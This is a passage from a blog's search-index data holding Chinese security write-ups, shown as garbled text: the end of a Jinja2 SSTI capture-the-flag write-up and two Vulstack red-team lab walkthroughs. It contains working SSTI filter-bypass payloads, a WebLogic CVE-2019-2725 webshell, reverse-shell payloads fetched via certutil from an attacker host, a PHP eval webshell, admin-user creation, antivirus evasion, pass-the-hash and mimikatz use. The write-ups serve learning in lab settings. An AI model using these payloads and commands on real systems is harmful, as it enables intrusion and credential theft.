1234567http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u006f\\u0073&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069&quot;)|attr(&quot;\\u0072\\u0065\\u0061\\u0064&quot;)())%&#125;æ¥ä¸‹æ¥å°è¯•è¯»å–flagï¼š&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u006f\\u0073&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067&quot;)|attr(&quot;\\u0072\\u0065\\u0061\\u0064&quot;)())%&#125; å¦ä¸€ç§æ€è·¯çœ‹äº†å¸ˆå‚…ä»¬çš„è§£æ³•ï¼Œæˆ‘åœ¨å°è¯•å¦ä¸€ç§ç¼–ç ç»•è¿‡çš„æ–¹å¼è§£å†³è¿™ä¸ªé—®é¢˜ 12345payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\\137\\137class\\137\\137%22)|attr(%22\\137\\137mro\\137\\137%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(1)|attr(%22\\137\\137subclasses\\137\\137%22)()|attr(%22\\137\\137\\147etitem\\137\\137%22)(186)|attr(%22\\137\\137init\\137\\137%22)|attr(%22\\137\\137\\147lobals\\137\\137%22)|attr(&quot;\\137\\137\\147etitem\\137\\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\\137\\137\\147etitem\\137\\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;payload2:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\\137\\137init\\137\\137%22)|attr(%22\\137\\137\\147lobals\\137\\137%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125; ä¸Šè¿°ä¸¤ç§æ–¹æ³•æ˜¯é€šè¿‡æ‰¾sysæ¨¡å—ä¸­çš„osè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ï¼ˆè†œä¸€ä¸‹å¸ˆå‚…ï¼šï¼‰ nctf 2020 ssti1blacklist = [&#x27;%&#x27;,&#x27;-&#x27;,&#x27;:&#x27;,&#x27;+&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;init&#x27;,&#x27;global&#x27;,&#x27;.&#x27;,&#x27;\\&#x27;&#x27;,&#x27;req&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;,&#x27;get&#x27;] æ‡’äº†ï¼Œæ”¹ä¸€ä¸‹ä¸Šé¢˜çš„blacklistç»§ç»­è·‘ï¼ˆdoge å…ˆç”¨bp fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ã€‚ æ ¹æ®ä¸Šé¢˜æ€è·¯ï¼Œå°è¯•unicodeç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ï¼Œå¦‚ class -&gt; \\u0063\\u006c\\u0061\\u0073\\u0073 è¿™ç§æ–¹æ³•å¯ä»¥æˆåŠŸbypassã€‚ å®˜æ–¹wpçš„æ–¹æ³•æ˜¯ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸‹é¢æ˜¯ç”¨16è¿›åˆ¶ç»•è¿‡çš„pldï¼š 1http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\\x5f\\x5fcla%22+%22ss\\x5f\\x5f%22][%22\\x5f\\x5fmr%22+%22o\\x5f\\x5f%22][1][%22\\x5f\\x5fsubcla%22+%22sses\\x5f\\x5f%22]()[186][%22\\x5f\\x5fin%22+%22it\\x5f\\x5f%22][%22\\x5f\\x5fgloba%22+%22ls\\x5f\\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125; unctf2020 sstiblacklist: 1[ ] &#x27; &quot; _ ç»•è¿‡æ–¹æ³•ï¼š 123[] : __getitem__&#x27;å’Œ&quot;: request.args.xxx_: |attr() 1Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read nctf 2020 ä½ å°±æ˜¯æˆ‘çš„masterå—blacklistï¼š 1&#x27; . _ class base subclasses request ç»•è¿‡æ–¹æ³•: 1234&#x27; : &quot;&quot;. :[&quot;xxx&quot;] _:å…«è¿›åˆ¶ åå…­è¿›åˆ¶ Unicode ç»•è¿‡ å…«è¿›åˆ¶å¦‚\\137å…³é”®å­—ï¼š å­—ç¬¦ä¸²æ‹¼æ¥ å¦‚ &quot;cla&quot;+&quot;ss&quot; Payload: 12http://192.168.1.103:5000/?url=&#123;&#123;0[&quot;\\137\\137cla&quot;+&quot;ss\\137\\137&quot;][&quot;\\137\\137mro\\137\\137&quot;][1][&quot;\\137\\137subclas&quot;+&quot;ses\\137\\137&quot;]()[186][&quot;\\137\\137init\\137\\137&quot;][&quot;\\137\\137globals\\137\\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125; æ€»ç»“flask/jinja2æ¸²æŸ“æ®·å‹¤çš„sstié—®é¢˜è€ƒå¯Ÿæ›´å¤šçš„æ˜¯å¯¹builtinså‡½æ•°/æ¨¡å—çš„ä½¿ç”¨ä»¥åŠäº†è§£ç¨‹åº¦ï¼Œå„ç§ç»•è¿‡è¿‡æ»¤æŠ€å·§ æ¢è€Œè¨€ä¹‹æ˜¯å¯¹pythonè¯­è¨€åŸºç¡€è¯­æ³•çš„ç†è§£ç¨‹åº¦å’Œé¢å‘å¯¹è±¡æ€æƒ³çš„ç†Ÿç»ƒç¨‹åº¦ã€‚","categories":[],"tags":[]},{"title":"VULSTACK çº¢é˜Ÿè¯„ä¼°(äºŒ) ","slug":"VULSTACK-çº¢é˜Ÿè¯„ä¼°-äºŒ","date":"2020-12-16T09:28:02.000Z","updated":"2020-12-16T09:30:37.940Z","comments":true,"path":"2020/12/16/VULSTACK-çº¢é˜Ÿè¯„ä¼°-äºŒ/","link":"","permalink":"https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/","excerpt":"","text":"Vulstackçº¢é˜Ÿè¯„ä¼°ï¼ˆäºŒï¼‰ç¯å¢ƒé…ç½®è¸©å‘webserverä¸€å¼€å§‹ç”¨é»˜è®¤å¯†ç ä¸Šä¸å»ï¼Œè¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯ç™»å½•administratorè´¦æˆ·ï¼Œç„¶åä¿®æ”¹å¯†ç ã€‚ éƒ¨ç½²ç½‘ç»œæ–°å»ºä¸€ä¸ªVMNETï¼Œç¼–å·ä¸º1ï¼Œæ¨¡å¼ä¸ºhostonlyï¼Œæ¨¡æ‹Ÿå†…ç½‘ç¯å¢ƒï¼Œç½‘æ®µä¸º10.10.10.0/24 NATç½‘æ®µä¸º192.168.111.0/24 DC(å†…ç½‘) ç½‘å¡é€‰æ‹©VMNET1ï¼ŒIPV4åœ°å€ä¸º 10.10.10.10 WIN7(å†…ç½‘) ç½‘å¡é€‰æ‹©VMNET1ï¼ŒIPV4åœ°å€ä¸º 10.10.10.20 WEBSERVERï¼ˆå†…å¤–ç½‘ï¼‰ ç½‘å¡1é€‰æ‹©VMNET1ï¼ŒIPV4åœ°å€ä¸º10.10.10.80ï¼Œç½‘å¡2é€‰æ‹©NATï¼ŒDHCP auto configurationï¼Œæœ¬æ¬¡åœ°å€ä¸º192.168.111.128 æœåŠ¡åœ¨C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\binç›®å½•ä¸‹å­˜åœ¨ä¸‰ä¸ªæ‰¹å¤„ç†æ–‡ä»¶setDomainEnvï¼ŒstartManagedWebLogicï¼ŒstopManagedWebLogicã€‚ç‚¹å‡»é…ç½®weblogicç¯å¢ƒã€‚ å¯åŠ¨æœåŠ¡åï¼Œè®¿é—®webæœåŠ¡å™¨ip:7001/consoleå³å¯è‡ªåŠ¨éƒ¨ç½²ã€‚ webæ‰“ç‚¹è¿›å…¥weblogicé¡µé¢åé¦–å…ˆå°è¯•å¼±å£ä»¤weblogic/weblogicï¼Œç™»é™†ä¸è¿›å»ï¼Œè€ƒè™‘ä½¿ç”¨weblogicæ‰«æå™¨ã€‚ é€šè¿‡æ‰«æå‘ç°äº†CVE-2019-2725æ¼æ´ï¼Œå°è¯•åˆ©ç”¨ã€‚ åˆ©ç”¨å·¥å…·ï¼š https://github.com/TopScrew/CVE-2019-2725 è¿™ä¸ªè„šæœ¬æœ‰ä¸ªé—®é¢˜ï¼Œæ˜æ˜importäº†sysï¼Œrequestsç­‰ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™è¿˜æ˜¯ä¼šæŠ¥æ²¡æœ‰importï¼Œå¾ˆå¥‡æ€ªï¼ŒæŠŠå®ƒæ”¾åˆ°if name=mainé‡Œé¢å°±å¥½äº†ï¼ˆè¿™é‡Œå¤§æ¦‚ç‡æ˜¯name==mainå¸¦æ¥çš„æ‰§è¡Œé¡ºåºçš„é—®é¢˜ï¼‰ é¡ºåˆ©è¿è¡Œè„šæœ¬åï¼Œå³å¯è·å¾—ä¸€ä¸ªwebshellï¼Œåœ°å€ä¸ºï¼š http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig å…ˆç”¨webshellæŸ¥çœ‹systeminfo,å‘ç°ä¸º64ä½æ“ä½œç³»ç»Ÿï¼Œå°è¯•ä½¿ç”¨msfvenomç”Ÿæˆ64ä½çš„reverse shell msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444 a- x64 -f exe &gt;/root/Desktop/shell.exe kaliå¯åŠ¨apacheæœåŠ¡ï¼Œå¹¶å°†webshellæ”¾åˆ°/var/www/htmlç›®å½•ä¸‹ åˆ©ç”¨Windowsè‡ªå¸¦çš„å·¥å…· certutilä¸‹è½½webshell certutil.exe -urlcache -split -f http://192.168.111.129/shell.exe ä½†æ˜¯ä¸è¡Œï¼Œç›´æ¥è¢«360å¹²æ‰äº†ã€‚ ä½¿ç”¨javaååºåˆ—åŒ–ç»ˆææµ‹è¯•å·¥å…·ç›´æ¥ä¸Šä¼ å†°èshellï¼Œç›®å½•ä¸º 1C:\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp å¯ä»¥ç›´æ¥è¿ä¸Š~ ä¸‹é¢å°†shellåå¼¹åˆ°msfä¸Šï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ¸—é€ã€‚ å†…ç½‘ä¿¡æ¯æœé›†åœ¨meterpreteré‡Œé¢ä½¿ç”¨run get_local_subnets è·å–æœåŠ¡å™¨ç½‘å¡ä¿¡æ¯ çœ‹åˆ°10ç½‘æ®µï¼Œæ·»åŠ 10ç½‘æ®µè·¯ç”±ï¼š run autoroute -s 10.10.10.0/24 ç„¶åå¯åŠ¨socksä»£ç† æˆ‘è¿™é‡Œå¯¹ä»£ç†çš„ç†è§£æ˜¯åœ¨msfå¯åŠ¨socks5ä»£ç†åï¼Œè®¾ç½®ç›‘å¬IPä¸ç«¯å£ï¼Œä»»ä½•ä½¿ç”¨proxychainsè¿›è¡Œçš„åŠ¨ä½œéƒ½ä¼šè½¬å‘åˆ°è®¾ç½®å¥½çš„ç›‘å¬ä¸ç«¯å£ä¸Šï¼Œä¸æ­¤åŒæ—¶msfè®¾ç½®äº†é€šå¾€é¶æœºå†…ç½‘çš„è·¯ç”±ï¼Œä¾¿å¯å°†è¯·æ±‚é€šè¿‡ï¼ˆå‘½ä»¤ï¼‰å†…ç½‘ä¸»æœºå‘é€å‡ºå»ã€‚ çœ‹ä¸€ä¸‹net user /domain å‘ç°äº†åŸŸå†…æœ‰äº”ä¸ªç”¨æˆ· æŸ¥è¯¢åŸŸæ§ 1net group &quot;Domain Controllers&quot; &#x2F;domain é€šè¿‡ipconfig /allæŸ¥è¯¢IPåœ°å€ä¸DNSæœåŠ¡å™¨åœ°å€ï¼ˆä¸€èˆ¬DNSæœåŠ¡å™¨åœ°å€æ˜¯DCï¼‰ ä½¿ç”¨net config workstation æŸ¥è¯¢å·¥ä½œç«™æƒ…å†µ å¯ä»¥ç¡®å®šï¼Œå½“å‰åŸŸä¸ºde1ay.com æ¥ä¸‹æ¥ä½¿ç”¨ladonæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»æƒ…å†µ åˆ©ç”¨å¤±è´¥ï¼Œæ— å›æ˜¾ï¼Œåœ¨è™šæ‹ŸæœºæŸ¥çœ‹å‘ç°è¢«360æ‹¦æˆªæ‰äº†ã€‚ ç”±äºjavaçš„meterpreteræ²¡æœ‰mimikatzæ¨¡å—ï¼Œæ‰€ä»¥è¿™é‡Œå°è¯•ä¸Šä¼ Windowsçš„shellå¹¶ä¸”åŠ è½½mimikatzæ¨¡å—ã€‚ï¼ˆå¿˜è®°äº†ä¹‹å‰ç”Ÿæˆçš„shellè¢«å¹²æ‰äº†ã€‚ã€‚æ²¡åŠæ³•ï¼Œå°è¯•å…æ€ï¼‰ ä½¿ç”¨goå…æ€csæˆåŠŸäº†ï¼ŒæˆåŠŸä¸Šçº¿ æ¥ä¸‹æ¥å°è¯•æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ· net user polosec admin@123 /add net localgroup Administrators polosec /add ç”±äº360æ‹¦æˆª æ·»åŠ å¤±è´¥ã€‚ é€šè¿‡æ¼æ´è¿›è¡Œæƒé™æå‡ï¼Œæ‹¿åˆ°ä¸€ä¸ªsystemæƒé™çš„shellã€‚ æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœºå°†csä¼šè¯æ´¾ç”Ÿç»™msf é¦–å…ˆCSæ–°å»ºä¸€ä¸ªforeign listenerï¼Œé€‰æ‹©httpsï¼Œè®°ä½è®¾ç½®çš„ç«¯å£å·å’Œhsotã€‚ msfä¸€æ ·çš„é…ç½® æ³¨æ„è¿™é‡Œä¸€å®šè¦é€‰reverse http å¦åˆ™meterpreterä¼šdie ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”¨ICMPåè®®æ¢æµ‹ä¸»æœºå­˜æ´»ï¼š 12for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot; ä½¿ç”¨arp -a æŸ¥çœ‹arpç¼“å­˜ ç¡®å®šä¸»æœºå¤§æ¦‚ä¸º: 10.10.10.10(DC), 10.10.10.80, 10.10.10.201 ç›®å‰10.10.10.80å·²ç»è¢«æ‹¿ä¸‹ï¼Œä¸‹é¢å°è¯•å¯¹10.10.10.10ä»¥åŠ10.10.10.201ä¸»æœºè¿›è¡Œæ¸—é€ã€‚ æ¸—é€åŸŸå†…ä¸»æœºé€šè¿‡PASS THE HASH çš„æ–¹å¼ä¼ é€’NTLM hashå®ç°ä¸Šçº¿DCå’ŒåŸŸå†…ä¸»æœºã€‚ å…·ä½“æ–¹æ³•ï¼š åœ¨CSä¸­ view target -add æ·»åŠ DCçš„IPï¼Œç‚¹å‡»jump ï¼ŒPS EXEC ï¼Œé€‰æ‹©ä¸€ä¸ªåŒåŸŸçš„è´¦å·å¯†ç è¿›è¡ŒPTHï¼Œå³å¯é¡ºåˆ©ä¸Šçº¿DCã€‚ ä¸Šçº¿DCåå†ç”¨mimikatzæŠ“ä¸€ä¸‹å¯†ç ï¼Œç„¶ååˆ©ç”¨åŒæ ·çš„æ–¹æ³•ä¸Šçº¿ä¸»æœº10.10.10.201ã€‚ é¡ºåˆ©ä¸Šçº¿ä¸»æœº10.10.10.201ï¼š æ€»ç»“é€šè¿‡æœ¬æ¬¡å¯¹vulstacké¶åœºçš„å­¦ä¹ ï¼Œ è¿›ä¸€æ­¥äº†è§£äº†CS MSFçš„ç”¨æ³•ï¼ŒåŠ æ·±äº†å¯¹bypass uac ã€ææƒçš„è®¤è¯†ï¼Œå­¦ä¹ äº†åˆæ­¥çš„å…æ€æŠ€å·§ï¼› å­¦ä¼šäº†åœ¨msfä¸­å¦‚ä½•é…ç½®è·¯ç”±å¯¹å†…ç½‘è¿›è¡Œæ‰«æï¼Œå­¦ä¹ äº†å‡ ä¸ªå¸¸ç”¨çš„ææƒæ–¹å¼ æ¯”å¦‚MS14058 MS15051ï¼› ä½¿ç”¨pthçš„æ–¹å¼ä¸Šçº¿åŸŸå†…ä¸»æœºç­‰ç­‰ã€‚ã€‚ ç›®å‰å­˜åœ¨çš„é—®é¢˜ä¹Ÿéå¸¸å¤šï¼ŒåŒ…æ‹¬ä¸å¤ªäº†è§£CSï¼ŒCSçš„shellæ‰çº¿ä¸çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œä»¥åŠè¿˜æœ‰å¾ˆå¤šå¾ˆå¤šç°åœ¨è¿˜æ²¡æœ‰å­¦ä¹ åˆ°çš„çŸ¥è¯†ã€‚ é’ˆå¯¹å½“å‰é—®é¢˜çš„å­¦ä¹ ç›®æ ‡ï¼šäº†è§£PTHï¼ŒæŒæ¡mimikatzçš„ç”¨æ³•ï¼Œäº†è§£å¦‚ä½•bypass uacï¼Œè®¤è¯†æ›´å¤šçš„ææƒæ–¹æ³•ã€‚","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"vulstack çº¢é˜Ÿè¯„ä¼°(ä¸€) å†…ç½‘æ¸—é€","slug":"vulstack-çº¢é˜Ÿè¯„ä¼°-ä¸€-å†…ç½‘æ¸—é€","date":"2020-12-03T10:04:01.000Z","updated":"2020-12-03T10:07:03.355Z","comments":true,"path":"2020/12/03/vulstack-çº¢é˜Ÿè¯„ä¼°-ä¸€-å†…ç½‘æ¸—é€/","link":"","permalink":"https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"vulstack çº¢é˜Ÿè¯„ä¼°ï¼ˆä¸€ï¼‰å‰è¨€è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åšå†…ç½‘æ¸—é€çš„ç›¸å…³å†…å®¹ï¼Œåšä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚ å‡†å¤‡å·¥ä½œä¸‹è½½é•œåƒï¼Œè™šæ‹Ÿæœºé»˜è®¤å¯†ç hongrisec@2019ï¼Œç™»é™†åæœ‰ä¸¤å°éœ€è¦æ”¹å¯†ç ï¼Œæ³¨æ„å¯†ç çš„æ ¼å¼ã€‚ã€‚åˆ«å¿˜äº†å†é‡è£…â€“ æˆ‘çš„å¯†ç æ˜¯ å¯¹ç½‘ç»œçš„éƒ¨ç½²éœ€è¦ä¸€å®šçš„è®¡ç®—æœºç½‘ç»œåŸºç¡€çŸ¥è¯†ã€‚ kali ç½‘å¡ï¼š NAT webæœåŠ¡å™¨ï¼ˆDMZåŒºï¼‰ï¼š ç½‘å¡1 NAT ç½‘å¡2 VMNET1ï¼ˆhostonlyï¼‰ å†…ç½‘æœåŠ¡å™¨1ï¼ˆåŸŸæ§ï¼‰ ç½‘å¡ VMNET1 hostonly å†…ç½‘æœåŠ¡å™¨2 ï¼š ç½‘å¡ VMNET1 hostonly éƒ¨ç½²å¥½åç”±äºWindows7å¼€äº†é˜²ç«å¢™ï¼Œå¯ä»¥å‘å¤–pingä½†æ˜¯pingä¸åŠ¨è¯¥æœºå™¨ï¼Œç”¨ä¸¤å°å†…ç½‘ä¸»æœºpingä¸€ä¸‹è¯•è¯•èƒ½ä¸èƒ½pingåŠ¨ã€‚ æ­£å¸¸æƒ…å†µä¸‹ ä¸»æœºå¯ä»¥pingé€šä¸¤å°å†…ç½‘ä¸»æœºï¼Œwin7å¯ä»¥pingé€šä¸¤å°å†…ç½‘ä¸»æœºï¼Œkaliå¯ä»¥pingé€šwin7ã€‚ webæ¸—é€å·¥ä½œå¼€å±€phpstudyæ¢é’ˆï¼ŒçŒœä¸€çŒœæ•°æ®åº“è´¦å·å¯†ç root/root phpmyadminé»˜è®¤è·¯å¾„ï¼Œæ—¥è¿›å»å°è¯•å†™æ—¥å¿—getshellã€‚ é¦–å…ˆçœ‹çœ‹æ˜¯å¦å¼€æ—¥å¿—äº† SHOW VARIABLES LIKE â€˜%general%â€™ æ²¡å¼€ï¼Œå¼€ä¸€ä¸‹ã€‚ set golbal general_log=on; è®¾ç½®ä¸‹æ—¥å¿—è·¯å¾„ï¼ˆæ¢é’ˆä¸­æŸ¥çœ‹ï¼‰ 1set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;; æ¥ä¸‹æ¥æŸ¥è¯¢ä¸€ä¸‹ï¼Œå†…å®¹æ˜¯shellã€‚ 1select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;; ä¹‹åè®¿é—®èšå‰‘é“¾æ¥shellå°±å¯ä»¥äº† è¿ä¸Šshellåwhoamiä¸€ä¸‹ï¼Œå‘ç°æ˜¯administratoræƒé™ï¼Œåœ¨GODåŸŸä¸‹(?å¯¹åŸŸçš„æ¦‚å¿µè¿˜ä¸å¤ªäº†è§£) æ¥ä¸‹æ¥ä½¿ç”¨msfvenomç”Ÿæˆshellè¿æ¥ã€‚ 123456msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exeuse exploit&#x2F;multi&#x2F;handler set payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.54.2set lport 5555exploit åœ¨èšå‰‘æ‰§è¡Œexeæ–‡ä»¶å³å¯è·å¾—åå¼¹shell ä¸å¤ªä¼šç”¨msfï¼Œæ‰§è¡Œå‘½ä»¤ä¸€ç›´å•¥éƒ½æ²¡æœ‰ï¼Œæœ€åçŸ¥é“msfæœ‰ä¸€å¥—è‡ªå·±çš„å‘½ä»¤ï¼Œè¾“å…¥shellåè·å¾—äº†é¶æœºçš„shellã€‚ 12run post&#x2F;windows&#x2F;manage&#x2F;enable_rdpå¯ç”¨RDPç™»å½•ã€‚ æ¥ä¸‹æ¥å°è¯•ä¸Šä¼ cs çš„beaconã€‚ csé¦–å…ˆè®¾ç½®listenerï¼Œç”ŸæˆWindowsçš„32ä½å¯æ‰§è¡Œç¨‹åº a.exe é€šè¿‡msfçš„meterpreterä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºå¹¶æ‰§è¡Œ upload /root/Desktop/1.exe execute -f 1.exe ä¹‹ååœ¨cså¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä¸Šçº¿ã€‚ msf meterpreter ç®€ä»‹ Meterpreteræ˜¯Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ã€‚ä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªMeterpreter shellçš„é“¾æ¥ã€‚Meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯ã€‚å¦å¤–Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚åœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±,å®ƒä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶,å› æ­¤HIDS[åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]å¾ˆéš¾å¯¹å®ƒåšå‡ºå“åº”ã€‚æ­¤å¤–å®ƒåœ¨è¿è¡Œçš„æ—¶å€™ç³»ç»Ÿæ—¶é—´æ˜¯å˜åŒ–çš„,æ‰€ä»¥è·Ÿè¸ªå®ƒæˆ–è€…ç»ˆæ­¢å®ƒå¯¹äºä¸€ä¸ªæœ‰ç»éªŒçš„äººä¹Ÿä¼šå˜å¾—éå¸¸å›°éš¾ã€‚ æœ€å,Meterpreterè¿˜å¯ä»¥ç®€åŒ–ä»»åŠ¡åˆ›å»ºå¤šä¸ªä¼šè¯ã€‚å¯ä»¥æ¥åˆ©ç”¨è¿™äº›ä¼šè¯è¿›è¡Œæ¸—é€ã€‚åœ¨Metasploit Frameworkä¸­ï¼ŒMeterpreteræ˜¯ä¸€ç§åæ¸—é€å·¥å…·ï¼Œå®ƒå±äºä¸€ç§åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¯é€šè¿‡ç½‘ç»œè¿›è¡ŒåŠŸèƒ½æ‰©å±•çš„åŠ¨æ€å¯æ‰©å±•å‹Payloadã€‚è¿™ç§å·¥å…·æ˜¯åŸºäºâ€œå†…å­˜DLLæ³¨å…¥â€ç†å¿µå®ç°çš„ï¼Œå®ƒèƒ½å¤Ÿé€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å¹¶è°ƒç”¨æ³¨å…¥çš„DLLæ¥è®©ç›®æ ‡ç³»ç»Ÿè¿è¡Œæ³¨å…¥çš„DLLæ–‡ä»¶ã€‚å…¶ä¸­ï¼Œæ”»å‡»è€…ä¸ç›®æ ‡è®¾å¤‡ä¸­Meterpreterçš„é€šä¿¡æ˜¯é€šè¿‡Stagerå¥—æ¥å­—å®ç°çš„meterpreterä½œä¸ºåæ¸—é€æ¨¡å—æœ‰å¤šç§ç±»å‹ï¼Œå¹¶ä¸”å‘½ä»¤ç”±æ ¸å¿ƒå‘½ä»¤å’Œæ‰©å±•åº“å‘½ä»¤ç»„æˆï¼Œæå¤§çš„ä¸°å¯Œäº†æ”»å‡»æ–¹å¼ã€‚ éœ€è¦è¯´æ˜çš„meterpreteråœ¨æ¼æ´åˆ©ç”¨æˆåŠŸåä¼šå‘é€ç¬¬äºŒé˜¶æ®µçš„ä»£ç å’ŒmeterpreteræœåŠ¡å™¨dllï¼Œæ‰€ä»¥åœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹ç»å¸¸å‡ºç°æ²¡æœ‰å¯æ‰§è¡Œå‘½ä»¤ï¼Œæˆ–è€…ä¼šè¯å»ºç«‹æ‰§è¡Œhelpä¹‹åå‘ç°ç¼ºå°‘å‘½ä»¤ã€‚ 